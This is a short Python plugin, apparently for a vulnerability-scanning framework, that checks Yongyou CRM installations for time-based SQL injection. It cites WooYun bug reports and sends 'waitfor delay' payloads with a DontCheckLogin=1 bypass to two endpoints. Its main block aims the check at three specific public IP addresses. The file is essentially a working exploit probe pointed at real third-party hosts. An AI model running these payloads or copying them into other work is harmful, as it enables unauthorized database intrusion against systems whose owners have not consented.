#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2015-0162117
#refer:http://www.wooyun.org/bugs/wooyun-2015-0162149

import time

def assign(service, arg):
    if service == 'yongyou_crm':
        return True, arg

def audit(arg):
    payloads = ['background/updateactivityemailnum.php?DontCheckLogin=1&ID=1;%20waitfor%20delay%20%270:0:5%27--',
            'background/reservationcomplete.php?DontCheckLogin=1&ID=1;%20waitfor%20delay%20%270:0:5%27--']
    for payload2 in payloads:
        payload1 = payload2.replace('0:0:5','0:0:0')
        t1 = time.time()
        code1, head, res, errcode, _ = curl.curl2(arg+payload1)
        t2 = time.time()
        code2, head, res, errcode, _ = curl.curl2(arg+payload2)
        t3 = time.time()
        if code1 == 200 and code2 == 200 and t3-2*t2+t1>3:
            security_hole(arg + payload1 + "   :sql Injection")
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_crm','http://180.169.30.13:2046/')[1])
    audit(assign('yongyou_crm','http://112.64.196.14/')[1])
    audit(assign('yongyou_crm','http://111.207.244.5:8888/')[1])